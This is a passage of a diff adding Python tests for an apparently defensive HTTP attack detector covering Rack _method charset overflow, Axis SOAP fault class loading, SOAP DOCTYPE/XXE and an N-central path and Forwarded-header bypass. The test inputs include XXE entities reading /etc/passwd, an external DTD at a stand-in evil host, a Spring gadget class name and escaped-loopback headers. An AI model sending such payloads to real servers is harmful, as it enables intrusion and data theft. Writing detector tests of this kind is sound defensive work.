+                + ct + b"\r\n\r\n" + DF + b"\r\n--b--\r\n")
+        parts, _ = hw.parse_multipart(body, b"b")
+        return hw.rack_part_encoding(parts[0])
+    cases = [
+        (b"text/plain; charset=ISO-8859-1", b"ISO-8859-1"),
+        (b"text/plain;charset=ISO-8859-1", b"ISO-8859-1"),
+        (b"text/plain\t; charset=ISO-8859-1", b"ISO-8859-1"),
+        (b'text/plain; charset="ISO-8859-1"; y=2', b"ISO-8859-1"),
+        (b"text/plain; x=1; charset=ISO-8859-1", b"ISO-8859-1"),
+        (b"text/plain; charset=CP1252", b"Windows-1252"),
+        # media type is compared case-SENSITIVELY, measured
+        (b"TEXT/PLAIN; charset=ISO-8859-1", None),
+        (b"Text/Plain; charset=ISO-8859-1", None),
+        # so is the parameter name, measured
+        (b"text/plain; CHARSET=ISO-8859-1", None),
+        (b"text/plain; Charset=ISO-8859-1", None),
+        # a label Ruby cannot resolve raises out of the parser: the request
+        # 500s and never reaches the application
+        (b"text/plain; charset=ISO-8859-1extra", None),
+        (b"text/plain; charset=", None),
+        # a charset on anything but text/plain is not honoured
+        (b"application/octet-stream; charset=ISO-8859-1", None),
+        (b"text/html; charset=ISO-8859-1", None),
+        # flat encodings cannot reach the overflow
+        (b"text/plain; charset=ISO-8859-7", None),
+        (b"text/plain; charset=Windows-1251", None),
+    ]
+    for ct, want in cases:
+        check(f"096 parity: {ct.decode()!r} -> {want}", enc(ct) == want)
+    check("096 parity: a part with a filename is never tagged",
+          enc(b"text/plain; charset=ISO-8859-1", filename=True) is None)
+    check("096 parity: a part with no Content-Type is not tagged",
+          hw.rack_part_encoding(hw.parse_multipart(
+              b'--b\r\nContent-Disposition: form-data; name="_method"'
+              b"\r\n\r\n" + DF + b"\r\n--b--\r\n", b"b")[0][0]) is None)
+
+
+def test_096_escalates_only_with_a_growing_encoding():
+    f = _f096(_rb_mp([_rb_field(b"_method", DF * 21,
+                                _TP + b"ISO-8859-1")]))
+    check("096: ISO-8859-1 part with 21 x 0xDF is critical",
+          f is not None and f.severity == "critical")
+    check("096: the growing byte is counted",
+          f is not None and f.evidence["growing_byte_count"] == 21)
+    check("096: the tagged encoding is reported canonically",
+          f is not None and f.evidence["tagged_encoding"] == "ISO-8859-1")
+    check("096: the declared charset is reported",
+          f is not None and f.evidence["declared_charset"] == "ISO-8859-1")
+    check("096: the raw value never appears in evidence by default",
+          f is not None and "payload" not in f.evidence)
+    check("096: the value is reported by digest and length only",
+          f is not None and f.evidence["value_digest"].startswith("sha256:")
+          and f.evidence["value_length"] == 21)
+    f = _f096(_rb_mp([_rb_field(b"_method", DF * 21,
+                                _TP + b"windows-1252")]))
+    check("096: Windows-1252 escalates too",
+          f is not None and f.severity == "critical"
+          and f.evidence["tagged_encoding"] == "Windows-1252")
+    f = _f096(_rb_mp([_rb_field(b"_method", DF * 40,
+                                _TP + b"ISO-8859-15")]))
+    check("096: escalation does not depend on the published count of 21",
+          f is not None and f.severity == "critical"
+          and f.evidence["growing_byte_count"] == 40)
+    f = _f096(_rb_mp([_rb_field(b"_method", DF, _TP + b"ISO-8859-1")]))
+    check("096: a single 0xDF under a growing encoding still escalates",
+          f is not None and f.severity == "critical")
+    # the flat encodings
+    f = _f096(_rb_mp([_rb_field(b"_method", DF * 21, _TP + b"ISO-8859-7")]))
+    check("096: a flat legacy encoding fires base, not critical",
+          f is not None and f.severity == "warn"
+          and f.evidence["tagged_encoding"] is None)
+    # a growing encoding without the byte
+    f = _f096(_rb_mp([_rb_field(b"_method", b"PU T", _TP + b"ISO-8859-1")]))
+    check("096: a growing encoding with no 0xDF fires base",
+          f is not None and f.severity == "warn"
+          and f.evidence["growing_byte_count"] == 0)
+
+
+def test_096_charset_field_is_not_a_rack_carrier():
+    """_charset_ does not exist in Rack, so it cannot escalate.
+
+    The advisory treats a preceding _charset_ field as a way to tag the
+    value. Measured against rack 2.2.7 it is not: the string "_charset_"
+    appears nowhere in the gem, and both a preceding and a following
+    _charset_ field left the value UTF-8. It is an ActionDispatch feature,
+    not a Rack one, so escalating on it would be a false positive.
+    """
+    f = _f096(_rb_mp([_rb_field(b"_charset_", b"ISO-8859-1"),
+                      _rb_field(b"_method", DF * 21)]))
+    check("096 _charset_: still fires, because the field is malformed",
+          f is not None and f.severity == "warn")
+    check("096 _charset_: but does NOT escalate",
+          f is not None and f.evidence["tagged_encoding"] is None)
+    f = _f096(_rb_mp([_rb_field(b"_method", DF * 21),
+                      _rb_field(b"_charset_", b"ISO-8859-1")]))
+    check("096 _charset_: a following field does not escalate either",
+          f is not None and f.severity == "warn")
+
+
+def test_096_urlencoded_carrier_cannot_escalate():
+    """A urlencoded body is never legacy-tagged, measured."""
+    f = _f096(_rb_urlenc(b"_method=" + b"%DF" * 21))
+    check("096 urlencoded: fires on the decoded bytes",
+          f is not None and f.evidence["carrier"] == "urlencoded"
+          and f.evidence["growing_byte_count"] == 21)
+    check("096 urlencoded: base severity only",
+          f is not None and f.severity == "warn")
+    f = _f096(_rb_urlenc(
+        b"_method=%DF",
+        ctype=b"application/x-www-form-urlencoded; charset=ISO-8859-1"))
+    check("096 urlencoded: a request charset does not tag the value",
+          f is not None and f.severity == "warn"
+          and f.evidence["tagged_encoding"] is None)
+    check("096 urlencoded: the declared charset is still reported",
+          f is not None and f.evidence["declared_charset"] == "ISO-8859-1")
+    check("096 urlencoded: the value is percent-decoded once",
+          _f096(_rb_urlenc(b"_method=%2520")) is None)
+
+
+def test_096_post_gate_and_excluded_carriers():
+    """ALLOWED_METHODS is %w[POST]; the query string and the header are out."""
+    for m in (b"GET", b"PUT", b"DELETE", b"PATCH", b"HEAD", b"OPTIONS"):
+        check(f"096 gate: {m.decode()} does not reach the middleware",
+              _f096(_rb_mp([_rb_field(b"_method", DF * 21,
+                                      _TP + b"ISO-8859-1")],
+                           method=m)) is None)
+    check("096 gate: POST does",
+          _f096(_rb_mp([_rb_field(b"_method", DF * 21,
+                                  _TP + b"ISO-8859-1")])) is not None)
+    check("096 carriers: the query string is not read",
+          _f096(b"POST /u?_method=" + b"%DF" * 21
+                + b" HTTP/1.1\r\nHost: r\r\n\r\n") is None)
+    check("096 carriers: X-HTTP-Method-Override is excluded",
+          _f096(b"POST /u HTTP/1.1\r\nHost: r\r\n"
+                b"X-HTTP-Method-Override: PU\xDFT\r\n\r\n") is None)
+    check("096 carriers: a malformed override header is still excluded",
+          _f096(b"POST /u HTTP/1.1\r\nHost: r\r\n"
+                b"X-HTTP-Method-Override: \x01\xDF \r\n\r\n") is None)
+    check("096 carriers: _method as a file part is not read",
+          _f096(_rb_mp([_rb_file(b"_method", DF * 21)])) is None)
+
+
+def test_096_negatives():
+    for m in (b"PATCH", b"delete", b"put", b"POST", b"M-SEARCH"):
+        check(f"096 negative: multipart _method={m.decode()} is silent",
+              _f096(_rb_mp([_rb_field(b"_method", m,
+                                      _TP + b"ISO-8859-1")])) is None)
+        check(f"096 negative: urlencoded _method={m.decode()} is silent",
+              _f096(_rb_urlenc(b"_method=" + m)) is None)
+    check("096 negative: a legacy part named comment full of 0xDF is silent",
+          _f096(_rb_mp([_rb_field(b"comment", DF * 21,
+                                  _TP + b"ISO-8859-1")])) is None)
+    check("096 negative: a UTF-8 sharp s in another field is silent",
+          _f096(_rb_mp([_rb_field(b"note", "ß".encode(),
+                                  _TP + b"ISO-8859-1")])) is None)
+    check("096 negative: no _method at all is silent",
+          _f096(_rb_mp([_rb_field(b"title", b"x")])) is None)
+    check("096 negative: an empty _method is silent",
+          _f096(_rb_mp([_rb_field(b"_method", b"")])) is None)
+
+
+def test_096_duplicate_fields_are_last_wins():
+    """Measured: both carriers keep the LAST _method."""
+    check("096 duplicates: multipart last-wins, clean last value is silent",
+          _f096(_rb_mp([_rb_field(b"_method", DF, _TP + b"ISO-8859-1"),
+                        _rb_field(b"_method", b"PUT",
+                                  _TP + b"ISO-8859-1")])) is None)
+    f = _f096(_rb_mp([_rb_field(b"_method", b"PUT", _TP + b"ISO-8859-1"),
+                      _rb_field(b"_method", DF, _TP + b"ISO-8859-1")]))
+    check("096 duplicates: multipart last-wins, hostile last value fires",
+          f is not None and f.severity == "critical")
+    check("096 duplicates: urlencoded last-wins, clean last value is silent",
+          _f096(_rb_urlenc(b"_method=%DF&_method=PUT")) is None)
+    check("096 duplicates: urlencoded last-wins, hostile last value fires",
+          _f096(_rb_urlenc(b"_method=PUT&_method=%DF")) is not None)
+
+
+def test_096_payload_logging_is_off_by_default():
+    raw = _rb_mp([_rb_field(b"_method", DF * 21, _TP + b"ISO-8859-1")])
+    f = _f096(raw)
+    check("096 payload: absent by default", f is not None
+          and "payload" not in f.evidence)
+    cfg = hw.WatchConfig(log_attack_payload=True)
+    hit = [x for x in _ex(raw, cfg) if x.code == "HTTP-096"]
+    check("096 payload: present only when the operator turns it on",
+          hit and "payload" in hit[0].evidence)
+
+
+# ---------------------------------------------------------------------------
+# HTTP-097 / HTTP-098: inbound SOAP Fault and DOCTYPE (Axis 1.x)
+# ---------------------------------------------------------------------------
+_E11 = "http://schemas.xmlsoap.org/soap/envelope/"
+_E12 = "http://www.w3.org/2003/05/soap-envelope"
+_GADGET = "org.springframework.context.support.ClassPathXmlApplicationContext"
+
+
+def _sx_req(xml, ctype=b"text/xml; charset=utf-8", method=b"POST",
+            target=b"/dms/services/ServerUI"):
+    if isinstance(xml, str):
+        xml = xml.encode()
+    return (method + b" " + target + b" HTTP/1.1\r\nHost: nc.corp\r\n"
+            b"Content-Type: " + ctype + b"\r\nContent-Length: "
+            + str(len(xml)).encode() + b"\r\n\r\n" + xml)
+
+
+def _sx_env11(inner, decl='<?xml version="1.0"?>'):
+    return (f'{decl}<s:Envelope xmlns:s="{_E11}"><s:Body>{inner}'
+            f'</s:Body></s:Envelope>')
+
+
+def _sx_fault(detail=None, cls=None):
+    d = detail if detail is not None else \
+        f'<detail><exceptionName>{cls or _GADGET}</exceptionName></detail>'
+    return f'<s:Fault><faultcode>s:Server</faultcode>' \
+           f'<faultstring>x</faultstring>{d}</s:Fault>'
+
+
+def _f(raw, code):
+    for f in _ex(raw):
+        if f.code == code:
+            return f
+    return None
+
+
+def test_097_axis_containment_chain_is_measured():
+    """soap_fault_exception_names against every Axis 1.4 measurement.
+
+    Each case below was run through the real jar with a recording class
+    loader; "fires" means Axis asked its class loader for the name.
+    """
+    S = hw.soap_fault_exception_names
+    hit = lambda x: bool(S(x))
+    # fires
+    check("097 chain: SOAP 1.1 detail/exceptionName",
+          hit(_sx_env11(_sx_fault())))
+    check("097 chain: a foreign prefix on exceptionName still fires",
+          hit(_sx_env11(_sx_fault(
+              '<detail xmlns:ax="urn:other">'
+              '<ax:exceptionName>a.B</ax:exceptionName></detail>'))))
+    check("097 chain: a default namespace on exceptionName still fires",
+          hit(_sx_env11(_sx_fault(
+              '<detail><exceptionName xmlns="urn:z">a.B</exceptionName>'
+              '</detail>'))))
+    check("097 chain: a namespace-qualified SOAP 1.1 detail fires",
+          hit(_sx_env11(_sx_fault(
+              '<s:detail><exceptionName>a.B</exceptionName></s:detail>'))))
+    check("097 chain: a Fault that is not the first Body child fires",
+          hit(_sx_env11('<ns:ping xmlns:ns="urn:x"/>' + _sx_fault())))
+    check("097 chain: SOAP 1.2 Detail fires",
+          hit(f'<env:Envelope xmlns:env="{_E12}"><env:Body><env:Fault>'
+              f'<env:Code><env:Value>env:Receiver</env:Value></env:Code>'
+              f'<env:Detail><exceptionName>a.B</exceptionName></env:Detail>'
+              f'</env:Fault></env:Body></env:Envelope>'))
+    # does not fire - each one measured NOT to reach the class loader
+    check("097 chain: ExceptionName is case-sensitive",
+          not hit(_sx_env11(_sx_fault(
+              '<detail><ExceptionName>a.B</ExceptionName></detail>'))))
+    check("097 chain: a capital Detail does not work in SOAP 1.1",
+          not hit(_sx_env11(_sx_fault(
+              '<Detail><exceptionName>a.B</exceptionName></Detail>'))))
+    check("097 chain: exceptionName outside detail does not fire",
+          not hit(_sx_env11(_sx_fault(
+              '<exceptionName>a.B</exceptionName>'))))
+    check("097 chain: exceptionName nested deeper than detail does not fire",
+          not hit(_sx_env11(_sx_fault(
+              '<detail><wrap><exceptionName>a.B</exceptionName></wrap>'
+              '</detail>'))))
+    check("097 chain: detail nested deeper than Fault does not fire",
+          not hit(_sx_env11(
+              '<s:Fault><faultcode>a</faultcode><mid><detail>'
+              '<exceptionName>a.B</exceptionName></detail></mid></s:Fault>')))
+    check("097 chain: a Fault nested deeper than Body does not fire",
+          not hit(_sx_env11('<wrap>' + _sx_fault() + '</wrap>')))
+    check("097 chain: a Fault with no namespace does not fire",
+          not hit(_sx_env11(
+              '<Fault><faultcode>a</faultcode><detail>'
+              '<exceptionName>a.B</exceptionName></detail></Fault>')))
+    check("097 chain: a foreign-namespace Fault does not fire",
+          not hit(_sx_env11(
+              '<f:Fault xmlns:f="urn:bogus"><faultcode>a</faultcode><detail>'
+              '<exceptionName>a.B</exceptionName></detail></f:Fault>')))
+    check("097 chain: a lower-case fault does not fire",
+          not hit(_sx_env11(
+              '<s:fault><faultcode>a</faultcode><detail>'
+              '<exceptionName>a.B</exceptionName></detail></s:fault>')))
+    check("097 chain: a lower-case SOAP 1.2 detail does not fire",
+          not hit(f'<env:Envelope xmlns:env="{_E12}"><env:Body><env:Fault>'
+                  f'<env:detail><exceptionName>a.B</exceptionName>'
+                  f'</env:detail></env:Fault></env:Body></env:Envelope>'))
+    check("097 chain: an unqualified SOAP 1.2 Detail does not fire",
+          not hit(f'<env:Envelope xmlns:env="{_E12}"><env:Body><env:Fault>'
+                  f'<Detail><exceptionName>a.B</exceptionName>'
+                  f'</Detail></env:Fault></env:Body></env:Envelope>'))
+    check("097 chain: a non-SOAP envelope namespace does not fire",
+          not hit('<s:Envelope xmlns:s="urn:nope"><s:Body>'
+                  + _sx_fault() + '</s:Body></s:Envelope>'))
+
+
+def test_097_reference_indirection_is_not_followed():
+    """Axis was measured NOT to resolve a multiRef/href on exceptionName."""
+    S = hw.soap_fault_exception_names
+    check("097 href: an href indirection does not fire",
+          not S(_sx_env11(_sx_fault(
+              '<detail><exceptionName href="#id0"/></detail>'))))
+    check("097 href: an empty exceptionName does not fire",
+          not S(_sx_env11(_sx_fault(
+              '<detail><exceptionName/></detail>'))))
+    check("097 href: a multiRef elsewhere in the body does not fire",
+          not S(_sx_env11(
+              _sx_fault('<detail><exceptionName href="#id0"/></detail>')
+              + '<multiRef id="id0">a.B</multiRef>')))
+
+
+def test_097_text_forms_resolve_like_axis():
+    """CDATA and character references reach the class name; entities do not."""
+    S = hw.soap_fault_exception_names
+    h = S(_sx_env11(_sx_fault(
+        '<detail><exceptionName><![CDATA[a.B.Cdata]]></exceptionName>'
+        '</detail>')))
+    check("097 text: CDATA content becomes the class name",
+          h and h[0].class_name == "a.B.Cdata")
+    h = S(_sx_env11(_sx_fault(
+        '<detail><exceptionName>a&#46;B&#x2E;C</exceptionName></detail>')))
+    check("097 text: numeric character references resolve",
+          h and h[0].class_name == "a.B.C")
+    h = S(_sx_env11(_sx_fault(
+        '<detail><exceptionName>a&amp;B</exceptionName></detail>')))
+    check("097 text: the five predefined entities resolve",
+          h and h[0].class_name == "a&B")
+    h = S(_sx_env11(_sx_fault(
+        '<detail><exceptionName>&xxe;</exceptionName></detail>')))
+    check("097 text: a general entity reference is NEVER expanded",
+          h and h[0].class_name == "&xxe;")
+    h = S(_sx_env11(_sx_fault(
+        '<detail><exceptionName>  a.B  </exceptionName></detail>')))
+    check("097 text: surrounding whitespace is kept, as Axis does not trim",
+          h and h[0].class_name == "  a.B  ")
+
+
+def test_097_fires_and_reports():
+    f = _f(_sx_req(_sx_env11(_sx_fault())), "HTTP-097")
+    check("097: a SOAP 1.1 inbound fault is critical",
+          f is not None and f.severity == "critical")
+    check("097: the SOAP version is reported",
+          f is not None and f.evidence["soap_version"] == "1.1")
+    check("097: the endpoint path is reported",
+          f is not None
+          and f.evidence["endpoint_path"] == "/dms/services/ServerUI")
+    check("097: the class name is carried as evidence",
+          f is not None and f.evidence["class_name"] == _GADGET)
+    check("097: no gadget list is consulted - any class name fires",
+          _f(_sx_req(_sx_env11(_sx_fault(cls="com.example.Harmless"))),
+             "HTTP-097") is not None)
+    check("097: application/soap+xml is identified too",
+          _f(_sx_req(_sx_env11(_sx_fault()),
+                     ctype=b"application/soap+xml"), "HTTP-097") is not None)
+    check("097: the rule does not gate on path",
+          _f(_sx_req(_sx_env11(_sx_fault()), target=b"/axis/services/Foo"),
+             "HTTP-097") is not None)
+    # Several faults in one body: the locator finds each one, and the
+    # attack-class dedup then collapses them to one finding per
+    # (code, client, server:port), which is the module-wide behaviour and
+    # applies to the new codes too.
+    two = _sx_env11(_sx_fault(cls="a.A") + _sx_fault(cls="b.B"))
+    check("097: the locator enumerates every qualifying exceptionName",
+          [h.class_name for h in hw.soap_fault_exception_names(two)]
+          == ["a.A", "b.B"])
+    w = hw.HttpWatch()
+    out = w.feed("x", "10.0.0.5", "10.0.0.9", 80, _sx_req(two), True, now=1.0)
+    check("097: attack-class dedup collapses them to one finding",
+          len([x for x in out if x.code == "HTTP-097"]) == 1)
+    check("097: and records the suppression",
+          w.stats.get("attacks_suppressed", 0) >= 1)
+
+
+def test_097_encodings():
+    body = _sx_env11(_sx_fault())
+    check("097 encoding: UTF-16LE with a BOM is decoded",
+          _f(_sx_req(("﻿" + body).encode("utf-16-le")),
+             "HTTP-097") is not None)
+    check("097 encoding: UTF-16BE with a BOM is decoded",
+          _f(_sx_req(("﻿" + body).encode("utf-16-be")),
+             "HTTP-097") is not None)
+    check("097 encoding: UTF-8 with a BOM is decoded",
+          _f(_sx_req(("﻿" + body).encode("utf-8")),
+             "HTTP-097") is not None)
+    check("097 encoding: UTF-32LE with a BOM is decoded",
+          _f(_sx_req(("﻿" + body).encode("utf-32-le")),
+             "HTTP-097") is not None)
+    check("097 encoding: BOM-less UTF-16LE is detected from the byte pattern",
+          _f(_sx_req(body.encode("utf-16-le")), "HTTP-097") is not None)
+    decl = '<?xml version="1.0" encoding="ISO-8859-1"?>'
+    check("097 encoding: the XML declaration's encoding is honoured",
+          _f(_sx_req(_sx_env11(_sx_fault(), decl=decl).encode("latin-1")),
+             "HTTP-097") is not None)
+    E = hw.xml_detect_encoding
+    check("097 encoding: a UTF-8 BOM is reported with its length",
+          E(b"\xef\xbb\xbf<x/>")[2] == 3)
+    check("097 encoding: UTF-32LE is tested before UTF-16LE",
+          E(b"\xff\xfe\x00\x00<")[0] == "utf-32-le")
+    check("097 encoding: an unknown charset label falls back to utf-8",
+          E(b"<x/>", b"no-such-charset")[0] == "utf-8")
+
+
+def test_097_negatives():
+    check("097 negative: a normal SOAP request is silent",
+          _f(_sx_req(_sx_env11(
+              '<ns:getServerInfo xmlns:ns="urn:x"><id>7</id>'
+              '</ns:getServerInfo>')), "HTTP-097") is None)
+    check("097 negative: a request Fault with no exceptionName is silent",
+          _f(_sx_req(_sx_env11(_sx_fault(
+              '<detail><stackTrace>x</stackTrace></detail>'))),
+             "HTTP-097") is None)
+    check("097 negative: a Fault with no detail at all is silent",
+          _f(_sx_req(_sx_env11(
+              '<s:Fault><faultcode>a</faultcode><faultstring>b</faultstring>'
+              '</s:Fault>')), "HTTP-097") is None)
+    check("097 negative: the word exceptionName as text is silent",
+          _f(_sx_req(_sx_env11(
+              '<ns:echo xmlns:ns="urn:x"><a>exceptionName org.evil.X</a>'
+              '</ns:echo>')), "HTTP-097") is None)
+    check("097 negative: a non-SOAP content type is silent",
+          _f(_sx_req(_sx_env11(_sx_fault()), ctype=b"application/json"),
+             "HTTP-097") is None)
+    check("097 negative: a non-SOAP XML body is silent",
+          _f(_sx_req("<root><Fault><detail><exceptionName>a.B"
+                     "</exceptionName></detail></Fault></root>"),
+             "HTTP-097") is None)
+    check("097 negative: an empty body is silent",
+          _f(_sx_req(""), "HTTP-097") is None)
+
+
+def test_097_request_direction_only():
+    """A Fault with an exceptionName in a RESPONSE is normal Axis output."""
+    body = _sx_env11(_sx_fault()).encode()
+    resp = (b"HTTP/1.1 500 Internal Server Error\r\n"
+            b"Content-Type: text/xml\r\nContent-Length: "
+            + str(len(body)).encode() + b"\r\n\r\n" + body)
+    out = hw.HttpWatch().feed("x", "10.0.0.9", "10.0.0.5", 80, resp,
+                              False, now=1.0)
+    check("097 direction: a response fault does not fire",
+          "HTTP-097" not in codes(out))
+    check("097 direction: nor does the response raise 098",
+          "HTTP-098" not in codes(out))
+
+
+def test_097_inner_direction_guard():
+    """check_soap_axis must refuse a response on its own, not only via
+    dispatch.
+
+    The bite tier escaped a mutation that deleted the function's own
+    msg.kind test, because inspect_message only reaches it inside an
+    "if msg.kind == 'request'" branch - so the outer gate hid the inner
+    one. Both are load-bearing: the inner guard is what makes the function
+    safe to call directly, which the h2c leg and any future caller do.
+    """
+    body = _sx_env11(_sx_fault()).encode()
+    raw = (b"HTTP/1.1 500 Internal Server Error\r\n"
+           b"Content-Type: text/xml\r\nContent-Length: "
+           + str(len(body)).encode() + b"\r\n\r\n" + body)
+    resp = hw.parse_message(raw, "response")
+    check("097 inner guard: a response parses as a response",
+          resp is not None and resp.kind == "response")
+    if resp is None:
+        return
+    out = hw.check_soap_axis(resp, body)
+    check("097 inner guard: called directly with a response it returns "
+          "nothing", out == [])
+    # and the same bytes as a request DO fire, so the guard is the only
+    # thing making the difference
+    req_raw = (b"POST /dms/services/ServerUI HTTP/1.1\r\nHost: v\r\n"
+               b"Content-Type: text/xml\r\nContent-Length: "
+               + str(len(body)).encode() + b"\r\n\r\n" + body)
+    req = hw.parse_message(req_raw, "request")
+    check("097 inner guard: the same body as a request fires",
+          req is not None
+          and [f.code for f in hw.check_soap_axis(req, body)] == ["HTTP-097"])
+
+
+def test_098_doctype_in_a_soap_envelope():
+    def dt(prolog, inner='<ns:p xmlns:ns="urn:x"/>'):
+        return _sx_req(prolog + _sx_env11(inner, decl=""))
+    f = _f(dt('<!DOCTYPE s:Envelope SYSTEM "http://evil.example:8080/e.dtd">'),
+           "HTTP-098")
+    check("098: an external SYSTEM DTD is critical",
+          f is not None and f.severity == "critical")
+    check("098: the external kind is reported",
+          f is not None and f.evidence["external_kind"] == "SYSTEM")
+    check("098: the scheme is reported",
+          f is not None and f.evidence["external_scheme"] == "http")
+    check("098: the host is reported, and never fetched",
+          f is not None
+          and f.evidence["external_host"] == "evil.example:8080")
+    f = _f(dt('<!DOCTYPE s:Envelope PUBLIC "-//X//DTD X//EN" '
+              '"ftp://h.example/a.dtd">'), "HTTP-098")
+    check("098: a PUBLIC identifier is critical",
+          f is not None and f.severity == "critical")
+    check("098: the public id is reported",
+          f is not None and f.evidence["public_id"] == "-//X//DTD X//EN")
+    check("098: the PUBLIC form's system id is the second literal",
+          f is not None and f.evidence["external_scheme"] == "ftp")
+    f = _f(dt('<!DOCTYPE s:Envelope [<!ENTITY % p SYSTEM '
+              '"http://e.example/x">%p;]>'), "HTTP-098")
+    check("098: a parameter entity is critical",
+          f is not None and f.severity == "critical"
+          and f.evidence["declares_parameter_entity"] is True)
+    f = _f(dt('<!DOCTYPE s:Envelope [<!ENTITY x SYSTEM "file:///etc/passwd">]>'),
+           "HTTP-098")
+    check("098: an external general entity is critical",
+          f is not None and f.severity == "critical"
+          and f.evidence["declares_external_entity"] is True)
+    f = _f(dt('<!DOCTYPE s:Envelope [<!ELEMENT x ANY>]>'), "HTTP-098")
+    check("098: element declarations alone are high, not critical",
+          f is not None and f.severity == "high"
+          and f.evidence["declares_element_or_attlist"] is True)
+    check("098: a high finding reports no external identifier",
+          f is not None and f.evidence["external_kind"] is None)
+    f = _f(dt('<!DOCTYPE s:Envelope [<!ENTITY a "b">]>'), "HTTP-098")
+    check("098: an internal entity with no retrieval is high",
+          f is not None and f.severity == "high"
+          and f.evidence["declares_entity"] is True
+          and f.evidence["declares_external_entity"] is False)
+
+
+def test_098_escaped_and_quoted_doctypes_are_content():
+    check("098: an escaped &lt;!DOCTYPE in a string parameter is content",
+          _f(_sx_req(_sx_env11(
+              '<ns:echo xmlns:ns="urn:x"><a>&lt;!DOCTYPE foo SYSTEM '
+              '"http://e/x"&gt;</a></ns:echo>')), "HTTP-098") is None)
+    check("098: a DOCTYPE inside a comment is not a DOCTYPE",
+          _f(_sx_req('<!-- <!DOCTYPE x SYSTEM "http://e/y"> -->'
+                     + _sx_env11('<ns:p xmlns:ns="urn:x"/>', decl="")),
+             "HTTP-098") is None)
+    check("098: a DOCTYPE inside CDATA is not a DOCTYPE",
+          _f(_sx_req(_sx_env11(
+              '<ns:echo xmlns:ns="urn:x"><a><![CDATA[<!DOCTYPE z SYSTEM '
+              '"http://e/z">]]></a></ns:echo>')), "HTTP-098") is None)
+    # The bite tier found this gap: disabling comment skipping is INERT for
+    # a plain "<!-- <!DOCTYPE ... > -->", because the generic "<!" branch
+    # then skips to the declaration's own '>' and the scanner resumes past
+    # it either way. It stops being inert when the comment contains a '>'
+    # BEFORE the DOCTYPE-looking text, which is the shape that distinguishes
+    # skipping a comment from skipping to the next '>'.
+    check("098: a comment carrying '>' before DOCTYPE text is still a "
+          "comment",
+          _f(_sx_req('<!-- > <!DOCTYPE s:Envelope SYSTEM "http://evil/x" -->'
+                     + _sx_env11('<ns:p xmlns:ns="urn:x"/>', decl="")),
+             "HTTP-098") is None)
+    check("098: the same shape inside a processing instruction is content",
+          _f(_sx_req('<?pi > <!DOCTYPE s:Envelope SYSTEM "http://evil/x" ?>'
+                     + _sx_env11('<ns:p xmlns:ns="urn:x"/>', decl="")),
+             "HTTP-098") is None)
+    check("098: and the same shape inside CDATA is content",
+          _f(_sx_req(_sx_env11(
+              '<ns:echo xmlns:ns="urn:x"><a><![CDATA[ > <!DOCTYPE z SYSTEM '
+              '"http://e/z"]]></a></ns:echo>')), "HTTP-098") is None)
+    check("098: a DOCTYPE after the root element is not in the prolog",
+          _f(_sx_req(_sx_env11('<ns:p xmlns:ns="urn:x"/>')
+                     + '<!DOCTYPE late SYSTEM "http://e/l">'),
+             "HTTP-098") is None)
+    check("098: a non-SOAP XML POST with a DOCTYPE is silent",
+          _f(_sx_req('<!DOCTYPE foo SYSTEM "http://e/x"><foo><bar/></foo>'),
+             "HTTP-098") is None)
+    check("098: a clean SOAP request is silent",
+          _f(_sx_req(_sx_env11('<ns:p xmlns:ns="urn:x"/>')),
+             "HTTP-098") is None)
+
+
+def test_098_parser_never_resolves_anything():
+    """The scanner has no retrieval and no general-entity expansion.
+
+    This is asserted on the text level rather than by watching for traffic,
+    which the sealed-lab tier does separately: a scanner that cannot name a
+    fetch cannot make one.
+    """
+    body = ('<!DOCTYPE s:Envelope [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+            + _sx_env11('<ns:echo xmlns:ns="urn:x"><a>&xxe;</a></ns:echo>',
+                        decl=""))
+    f = _f(_sx_req(body), "HTTP-098")
+    check("098 passive: the declaration is recorded",
+          f is not None and f.evidence["declares_external_entity"] is True)
+    check("098 passive: the system id is reported by scheme, not content",
+          f is not None and f.evidence["external_scheme"] is None)
+    text, _ = hw.xml_decode_body(body.encode())
+    check("098 passive: the entity reference survives unexpanded",
+          "&xxe;" in text)
+    check("098 passive: no file content can appear in the scanned text",
+          "root:" not in text)
+    check("098 passive: xml_text_value leaves a general entity alone",
+          hw.xml_text_value("&xxe;") == "&xxe;")
+    check("098 passive: and resolves only character references",
+          hw.xml_text_value("&#65;&amp;&xxe;") == "A&&xxe;")
+
+
+# ---------------------------------------------------------------------------
+# HTTP-099: N-central semicolon + Forwarded bypass
+# ---------------------------------------------------------------------------
+def _nc_req(target, *hdrs, method=b"GET"):
+    h = b"".join(x + b"\r\n" for x in hdrs)
+    return method + b" " + target + b" HTTP/1.1\r\nHost: nc.corp\r\n" + h + b"\r\n"
+
+
+_ESC4 = b'Forwarded: for="12\\7.0.0.1"'
+_ESC6 = b'Forwarded: for="[::\\1]"'
+
+
+def test_099_path_half():
+    T = hw.target_first_segment_param
+    check("099 path: a raw ';' on the first segment is a path parameter",
+          T(b"/dms;x=1/services/ServerUI") == (b"dms", b"x=1"))
+    check("099 path: a bare ';' counts",
+          T(b"/dms;/services/ServerUI") == (b"dms", b""))
+    check("099 path: a clean path has none",
+          T(b"/dms/services/ServerUI") is None)
+    check("099 path: a parameter on a later segment is not the first",
+          T(b"/dms/services;x=1/ServerUI") is None)
+    check("099 path: jsessionid on the last segment is not the first",
+          T(b"/dms/services/ServerUI;jsessionid=ABC") is None)
+    # measured: %3B decodes to a literal ';' INSIDE the segment, so the
+    # prefix no longer matches and the request reaches nothing
+    check("099 path: %3B is not a path parameter",
+          T(b"/dms%3Bx=1/services/ServerUI") is None)
+    check("099 path: the query string is not searched",
+          T(b"/dms/services/ServerUI?a=b;c=d") is None)
+    check("099 path: a fragment is not searched",
+          T(b"/dms/services/ServerUI#a;b") is None)
+    check("099 path: a parameter on a single-segment path is found",
+          T(b"/dms;x=1") == (b"dms", b"x=1"))
+
+
+def test_099_forwarded_half():
+    Q = hw.forwarded_escaped_quoted
+    check("099 header: a quoted value with an embedded escape resolves",
+          Q(b'"12\\7.0.0.1"') == b"127.0.0.1")
+    check("099 header: a leading escape resolves",
+          Q(b'"\\127.0.0.1"') == b"127.0.0.1")
+    check("099 header: a mid-value escape resolves",
+          Q(b'"127.0\\.0.1"') == b"127.0.0.1")
+    check("099 header: a bracketed IPv6 escape resolves",
+          Q(b'"[::\\1]"') == b"[::1]")
+    # the legitimate look-alikes
+    check("099 header: a quoted IPv6 node with no escape is None",
+          Q(b'"[2001:db8::1]:4711"') is None)
+    check("099 header: a quoted IPv4 with no escape is None",
+          Q(b'"1.2.3.4"') is None)
+    check("099 header: an unquoted value is None", Q(b"1.2.3.4") is None)
+    check("099 header: an unquoted value with a backslash is None",
